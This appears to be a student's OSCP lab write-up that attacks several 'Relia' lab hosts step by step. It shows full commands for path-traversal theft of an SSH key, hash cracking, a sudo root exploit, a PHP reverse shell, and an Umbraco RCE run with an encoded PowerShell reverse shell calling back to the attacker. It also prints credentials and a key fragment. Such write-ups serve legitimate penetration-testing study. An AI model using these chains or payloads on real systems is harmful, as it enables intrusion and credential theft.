ulMdp1RxRcQuNoGPkjOnyXK/hj9lZ6vTGwLyZiFseXfRi8Dd93YsG0VmEOm3BWvvCv+26M
8eyPQgiBD4dPphmNWZ0vQJ6qnbZBWCmRPCpp2nmSaT3odbRaScEUT5VnkpxmqIQfT+p8AO
CAH+RLndklWU8DpYtB4cOJG/f9Jd7Xtwg3bi1rkRKsyp8yHbA+wsfc2yLWM=
-----END OPENSSH PRIVATE KEY-----
```

4. Crack this file using john
```
1. Downloading id_ecdsa file
┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ wget http://192.168.208.245/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/anita/.ssh/id_ecdsa
--2024-02-14 06:10:33--  http://192.168.208.245/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/anita/.ssh/id_ecdsa
Connecting to 192.168.208.245:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 557
Saving to: ‘id_ecdsa’

id_ecdsa             100%[======================>]     557  --.-KB/s    in 0s      

2024-02-14 06:10:34 (110 MB/s) - ‘id_ecdsa’ saved [557/557]

2. Getting hash out of it. 
┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ ssh2john id_ecdsa > id_ecdsa.hash 

3. Remove first string 
┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ cat id_ecdsa.hash 
$sshng$6$16$0ef9e445850d777e7da427caa9b729cc$359$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000100ef9e445850d777e7da427caa9b729cc0000001000000001000000680000001365636473612d736861322d6e69737470323536000000086e697374703235360000004104afad8408da4537cd62d9d3854a02bf636ce8542d1ad6892c1a4b8726fbe2148ea75a67d299b4ae635384c7c0ac19e016397b449602393a98e4c9a2774b0d2700000000b0d0768117bce9ff42a2ba77f5eb577d3453c86366dd09ac99b319c5ba531da7547145c42e36818f9233a7c972bf863f6567abd31b02f266216c7977d18bc0ddf7762c1b456610e9b7056bef0affb6e8cf1ec8f4208810f874fa6198d599d2f409eaa9db6415829913c2a69da7992693de875b45a49c1144f9567929c66a8841f4fea7c00e0801fe44b9dd925594f03a58b41e1c3891bf7fd25ded7b708376e2d6b9112acca9f321db03ec2c7dcdb22d63$16$183

4. Crack it using john
──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt id_ecdsa.hash         
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
fireball         (?)     
1g 0:00:01:23 DONE (2024-02-14 06:15) 0.01198g/s 49.07p/s 49.07c/s 49.07C/s mom123..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

5. Ssh login with user anita
```
┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ ssh -i id_ecdsa -p 2222 anita@192.168.208.245
Enter passphrase for key 'id_ecdsa': 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 14 Feb 2024 11:17:47 AM UTC

  System load:  0.0               Processes:               153
  Usage of /:   65.7% of 7.77GB   Users logged in:         0
  Memory usage: 14%               IPv4 address for ens192: 192.168.208.245
  Swap usage:   0%


1 update can be applied immediately.
1 of these updates is a standard security update.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Nov 11 12:06:55 2022 from 192.168.118.2
$ whoami
anita
```

6. Obtained local.txt
```
$ cat local.txt 
c87b39cdb07c09b84b90a6841631a21c
```

7. Upgrad shell to bash
```
SHELL=/bin/bash script -q /dev/null
```

8. Looked for following without success
```
1. SUID permissions
2. SUDO 
3. Add root user
4. Cron jobs
5. kernal exploit
```

9. Upload and run winpeas. Find out vulnerable sudo version. 
```
anita@web01:/tmp$ wget http://192.168.45.242/linpeas.sh

anita@web01:/tmp$ chmod 777 linpeas.sh 
anita@web01:/tmp$ ./linpeas.sh 

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version     
Sudo version 1.8.31 
```

10. Download exploit for this sudo version and obtain root shell. Make sure to use writable file 
```
https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py

anita@web01:/tmp$ wget http://192.168.45.242/exploit_nss.py

anita@web01:/tmp$ ls
exploit_nss.py

anita@web01:/tmp$ ./exploit_nss.py 
# id
uid=0(root) gid=0(root) groups=0(root),998(apache),1004(anita)
```

11. Obtained proof.txt, upgrade shell 
```
# cat proof.txt 
708d60e6e14c3d288f4de1e3fda13987

# SHELL=/bin/bash script -q /dev/null
root@web01:/root# l
```

12. Checked for internal network, no internal network found. 
```
root@web01:/# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:ba:bd:04 brd ff:ff:ff:ff:ff:ff
    inet 192.168.216.245/24 brd 192.168.216.255 scope global ens192
       valid_lft forever preferred_lft forever
```

13. Also tried with chisel and netdiscover, No internal network discovered. 
```
┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ ./chisel server -p 8080 --reverse                  
2024/02/14 19:45:59 server: Reverse tunnelling enabled
2024/02/14 19:45:59 server: Fingerprint A9Sf99hCpzX2d9W/MVUllwBGjybXj8QlmjI+RGn2CU0=
2024/02/14 19:45:59 server: Listening on http://0.0.0.0:8080
2024/02/14 19:47:09 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening


root@web01:/# ./chisel client 192.168.45.242:8080 R:1080:socks
2024/02/15 00:47:07 client: Connecting to ws://192.168.45.242:8080
2024/02/15 00:47:10 client: Connected (Latency 384.518913ms)

proxychains sudo netdiscover -r 172.16.106.0/24

 Currently scanning: Finished!   |   Screen View: Unique Hosts             
                                                                           
 7 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 420           
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.189.2   00:50:56:fb:70:30      6     360  VMware, Inc.            
 192.168.189.254 00:50:56:e5:d3:d8      1      60  VMware, Inc.            

zsh: suspended  sudo proxychains netdiscover -r 172.16.106.0/24
```

## 246
1. Rustscan and Nmap scans
```
rustscan 192.168.208.246 

Open 192.168.208.246:80
Open 192.168.208.246:443
Open 192.168.208.246:2222


┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ nmap -p$(cat 246-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.208.246 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-14 01:20 EST
Nmap scan report for 192.168.208.246
Host is up (0.42s latency).

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Code Validation
|_http-server-header: Apache/2.4.52 (Ubuntu)
443/tcp  open  ssl/http Apache httpd 2.4.52 ((Ubuntu))
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=demo
| Subject Alternative Name: DNS:demo
| Not valid before: 2022-10-12T07:46:27
|_Not valid after:  2032-10-09T07:46:27
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Code Validation
| tls-alpn: 
|_  http/1.1
2222/tcp open  ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 42:2d:8d:48:ad:10:dd:ff:70:25:8b:46:2e:5c:ff:1d (ECDSA)
|_  256 aa:4a:c3:27:b1:19:30:d7:63:91:96:ae:63:3c:07:dc (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.77 seconds

```

2. Tried brupsuite capture, figured the http code submit page to be rabbit hole, use the anita creds to ssh login. 
```
┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ ssh -i id_ecdsa anita@192.168.216.246 -p 2222


$ hostname
demo
$ SHELL=/bin/bash script -q /dev/null
anita@demo:~$ 
```

3. Obtained local.txt
```
 cat local.txt
2dbb89a9b663d13da0e0b097d1d4a19b
```

4. Check for PE for different vector, that time figure out internal network at port 8000 and page. 
```
anita@demo:/var/www/internal/backend/views$ ls                               
admin.inc  debug.inc  user.inc 

anita@demo:~$ ss -ntlp
State   Recv-Q  Send-Q    Local Address:Port     Peer Address:Port  Process  
LISTEN  0       4096      127.0.0.53%lo:53            0.0.0.0:*              
LISTEN  0       511           127.0.0.1:8000          0.0.0.0:*              
LISTEN  0       128             0.0.0.0:2222          0.0.0.0:*              
LISTEN  0       511                   *:443                 *:*              
LISTEN  0       128                [::]:2222             [::]:*              
LISTEN  0       511                   *:80                  *:* 
```

5. Establish chiesel connection for listening internal port. 
```
┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ ./chisel server -p 9000 --reverse
2024/02/14 22:25:54 server: Reverse tunnelling enabled
2024/02/14 22:25:54 server: Fingerprint Pxo5G5ikKC6pwlARl6Y433LYvgZ4qcXIigy8X2tmuFc=
2024/02/14 22:25:54 server: Listening on http://0.0.0.0:9000
2024/02/14 22:26:57 server: session#1: tun: proxy#R:8000=>8000: Listening

anita@demo:~$ ./chisel client 192.168.45.242:9000 R:8000:127.0.0.1:8000 #chiselfixedlistener
2024/02/15 03:26:55 client: Connecting to ws://192.168.45.242:9000
2024/02/15 03:26:58 client: Connected (Latency 384.246827ms)
```

6. Performed directory search and found useful sub directory - backend
```
┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ gobuster dir -u http://127.0.0.1:8000/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://127.0.0.1:8000/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/backend              (Status: 301) [Size: 315] [--> http://127.0.0.1:8000/backend/]                                                                        
/css                  (Status: 301) [Size: 311] [--> http://127.0.0.1:8000/css/]                                                                            
/fonts                (Status: 301) [Size: 313] [--> http://127.0.0.1:8000/fonts/]                                                                          
/img                  (Status: 301) [Size: 311] [--> http://127.0.0.1:8000/img/]                                                                            
/index.php            (Status: 200) [Size: 4948]
/js                   (Status: 301) [Size: 310] [--> http://127.0.0.1:8000/js/]                                                                             
/server-status        (Status: 200) [Size: 11249]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

7. Figured out directory transversal to read /etc/passwd
```
http://127.0.0.1:8000/backend/?view=../../../../../../../etc/passwd
```

8. Checked out writable directory on anita ssh connection. 
```
anita@demo:~$ find / -writable -type d 2>/dev/null
/tmp
/tmp/.Test-unix
/tmp/.ICE-unix
/tmp/.XIM-unix
/tmp/.font-unix
/tmp/.X11-unix
/run/user/1001
/run/user/1001/gnupg
/run/user/1001/systemd
/run/user/1001/systemd/generator.late
/run/user/1001/systemd/generator.late/xdg-desktop-autostart.target.wants
/run/user/1001/systemd/units
/run/user/1001/systemd/inaccessible
/run/screen
/run/lock
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope
/var/tmp
/var/crash
/var/lib/php/sessions
/proc/2057/task/2057/fd
/proc/2057/fd
/proc/2057/map_files
/home/anita
/home/anita/.ssh
/home/anita/.cache
/dev/mqueue
/dev/shm
```

9. Tried monkey pentest reverse shell file on both /tmp and /dev/shm with nc listener, /dev/shm give reverse shell. 
```
anita@demo:/tmp$ wget http://192.168.45.242/php-reverse-shell.php
anita@demo:/tmp$ ls
php-reverse-shell.php

anita@demo:/dev/shm$ ls
php-reverse-shell.php


┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ sudo nc -nvlp 1234                             
sudo: unable to resolve host kali: Name or service not known
[sudo] password for kali: 
listening on [any] 1234 ...
connect to [192.168.45.242] from (UNKNOWN) [192.168.216.246] 46458
Linux demo 5.15.0-52-generic #58-Ubuntu SMP Thu Oct 13 08:03:55 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 03:53:04 up  4:55,  2 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
anita    pts/0    192.168.45.242   01:50   26:09   0.03s  0.03s script -q /dev/null
anita    pts/2    192.168.45.242   03:42   15.00s  0.00s  0.00s script -q /dev/null
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ SHELL=/bin/bash script -q /dev/null
www-data@demo:/$ whoami
whoami
www-data
```

10. Login as root and obtained proof.txt
```
www-data@demo:/$ sudo -l
sudo -l
Matching Defaults entries for www-data on demo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on demo:
    (ALL) NOPASSWD: ALL
www-data@demo:/$ sudo su -
sudo su -
root@demo:~# whoami
whoami
root


root@demo:~# cat proof.txt
cat proof.txt
da9f3ab53e0c4e9dbeb658a565ebff82
```


## 247
1. Rustscan and Nmap scans
```
rustscan 192.168.208.247

Open 192.168.208.247:80
Open 192.168.208.247:135
Open 192.168.208.247:139
Open 192.168.208.247:443
Open 192.168.208.247:445
Open 192.168.208.247:3389
Open 192.168.208.247:5985
Open 192.168.208.247:14020
Open 192.168.208.247:14080
Open 192.168.208.247:47001
Open 192.168.208.247:49664
Open 192.168.208.247:49665
Open 192.168.208.247:49666
Open 192.168.208.247:49667
Open 192.168.208.247:49668
Open 192.168.208.247:49669
Open 192.168.208.247:49670


┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ nmap -p$(cat 247-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.208.247 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-14 01:20 EST
Nmap scan report for 192.168.208.247
Host is up (0.39s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
|_http-title: RELIA - New Hire Information
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-title: RELIA - New Hire Information
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-02-14T06:22:16+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WEB02
|   NetBIOS_Domain_Name: WEB02
|   NetBIOS_Computer_Name: WEB02
|   DNS_Domain_Name: WEB02
|   DNS_Computer_Name: WEB02
|   Product_Version: 10.0.20348
|_  System_Time: 2024-02-14T06:22:02+00:00
| ssl-cert: Subject: commonName=WEB02
| Not valid before: 2024-01-28T22:00:04
|_Not valid after:  2024-07-29T22:00:04
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
14020/tcp open  ftp           FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r-- 1 ftp ftp         237639 Nov 04  2022 umbraco.pdf
|_ftp-bounce: bounce working!
14080/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-02-14T06:22:07
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.85 seconds

```

2. Obtained umbraco.pdf form anonymous ftp. 

3. Find out umbraco user name mark and then its version after  visiting it after giving fqdn of web02.relia.com. Observed it version 7.12.4.  by logging in poer 14080

4. Search and found exploit for umbraco 7.12.4
```
┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ searchsploit umbraco          
------------------------------------------- ---------------------------------
 Exploit Title                             |  Path
------------------------------------------- ---------------------------------
Umbraco CMS - Remote Command Execution (Me | windows/webapps/19671.rb
Umbraco CMS 7.12.4 - (Authenticated) Remot | aspx/webapps/46153.py
Umbraco CMS 7.12.4 - Remote Code Execution | aspx/webapps/49488.py
Umbraco CMS 8.9.1 - Directory Traversal    | aspx/webapps/50241.py
Umbraco CMS SeoChecker Plugin 1.9.2 - Cros | php/webapps/44988.txt
Umbraco v8.14.1 - 'baseUrl' SSRF           | aspx/webapps/50462.txt
------------------------------------------- ---------------------------------
Shellcodes: No Results
```

5. Exploit it and obtaiend shell
```
1. Created reverse command in encoded form. 
$text in google docs 

┌──(kali㉿kali)-[/home/kali/OSCP/labs/relia]
└─PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)               

┌──(kali㉿kali)-[/home/kali/OSCP/labs/relia]
└─PS> $EncodedText =[Convert]::ToBase64String($Bytes)                        

┌──(kali㉿kali)-[/home/kali/OSCP/labs/relia]
└─PS> $EncodedTex                                                            

┌──(kali㉿kali)-[/home/kali/OSCP/labs/relia]
└─PS> $EncodedText                                                           
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIANAAyACIALAA4ADAAOQAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==

2. Run the exploit
┌──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ python 49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i 'http://web02.relia.com:14080/' -c powershell -a "-e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIANAAyACIALAA4ADAAOQAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

3. Captured shell
──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ sudo nc -nvlp 8090  
sudo: unable to resolve host kali: Name or service not known
[sudo] password for kali: 
listening on [any] 8090 ...
connect to [192.168.45.242] from (UNKNOWN) [192.168.216.247] 49816
whoami
iis apppool\defaultapppool
PS C:\windows\system32\inetsrv>

```

6. Obtained local.txt
```
S C:\> cat local.txt
2d06244ade0d617f5803c191c53d68cd
```

7. Tried binary service hijaking by replacing httpd.exe with own msfvenom payload but did not work out because when I replace httpd.exe with own payload then cannot start apache2.4 service. 

8. Tried with godpotato. 
```
https://github.com/BeichenDream/GodPotato

iwr -uri http://192.168.45.242/GodPotato-NET4.exe -Outfile GodPotato-NET42.exe

 .\GodPotato-NET42.exe -cmd "cmd /c whoami"
```

9. Obtained proof.txt after navigating with godpotato, could not get reverse shell with god potato thought. 
```
PS C:\xampp\apache\bin>  .\GodPotato-NET42.exe -cmd "cmd /c type C:\users\Administrator\Desktop\proof.txt"
[*] CombaseModule: 0x140718178304000
[*] DispatchTable: 0x140718180894536
[*] UseProtseqFunction: 0x140718180189664
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\07081719-fb1d-4a33-a370-8651ada6514c\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00009802-0dd4-ffff-ad4f-4a6740551aa8
[*] DCOM obj OXID: 0x34b68a57e067dafd
[*] DCOM obj OID: 0xc11153830927fd30
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 892 Token:0x740  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 5592
8520fa14cfba189417c89b162f6697a4
```


## 248
1. Rustscan and Nmap scans
```
rustscan 192.168.208.248

80/tcp    open  http          syn-ack
135/tcp   open  msrpc         syn-ack
139/tcp   open  netbios-ssn   syn-ack
445/tcp   open  microsoft-ds  syn-ack
3389/tcp  open  ms-wbt-server syn-ack
5985/tcp  open  wsman         syn-ack
47001/tcp open  winrm         syn-ack
49664/tcp open  unknown       syn-ack
49665/tcp open  unknown       syn-ack
49666/tcp open  unknown       syn-ack
49667/tcp open  unknown       syn-ack
49668/tcp open  unknown       syn-ack
49669/tcp open  unknown       syn-ack
49670/tcp open  unknown       syn-ack
49965/tcp open  unknown       syn-ack

──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ nmap -p$(cat 248-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.208.248 

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-14 01:22 EST
Nmap scan report for 192.168.208.248
Host is up (0.38s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Home
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 16 disallowed entries (15 shown)
| /*/ctl/ /admin/ /App_Browsers/ /App_Code/ /App_Data/ 
| /App_GlobalResources/ /bin/ /Components/ /Config/ /contest/ /controls/ 
|_/Documentation/ /HttpModules/ /Install/ /Providers/
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=EXTERNAL
| Not valid before: 2024-01-28T21:13:08
|_Not valid after:  2024-07-29T21:13:08
|_ssl-date: 2024-02-14T06:23:17+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: EXTERNAL
|   NetBIOS_Domain_Name: EXTERNAL
|   NetBIOS_Computer_Name: EXTERNAL
|   DNS_Domain_Name: EXTERNAL
|   DNS_Computer_Name: EXTERNAL
|   Product_Version: 10.0.20348
|_  System_Time: 2024-02-14T06:23:07+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49965/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-01-29T21:13:13
|_Not valid after:  2054-01-29T21:13:13
